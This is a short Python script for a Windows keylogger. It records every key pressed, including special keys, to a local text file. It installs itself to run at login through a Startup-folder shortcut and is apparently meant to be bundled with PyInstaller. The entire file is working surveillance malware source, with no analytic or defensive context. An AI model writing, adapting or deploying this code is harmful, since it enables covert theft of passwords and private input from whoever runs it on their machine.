import os
import sys
from pynput import keyboard
import win32com.client

# Define the file where the keystrokes will be logged
log_file = "keystrokes.txt"

def add_to_startup():
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    script_path = sys.executable  # This will be the path to the executable after PyInstaller

    # Define the path for the shortcut
    shortcut_path = os.path.join(startup_folder, 'keystroke_logger.lnk')
    
    # Create the shortcut
    shell = win32com.client.Dispatch("WScript.Shell")
    shortcut = shell.CreateShortCut(shortcut_path)
    shortcut.TargetPath = script_path
    shortcut.WorkingDirectory = os.path.dirname(script_path)
    shortcut.save()

def on_press(key):
    try:
        with open(log_file, "a") as file:
            # Record the key pressed, handling special keys
            if hasattr(key, 'char') and key.char is not None:
                file.write(key.char)
            else:
                file.write(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

if __name__ == "__main__":
    # Add to startup if not already added
    add_to_startup()
    
    # Setup the listener threads for capturing key presses
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
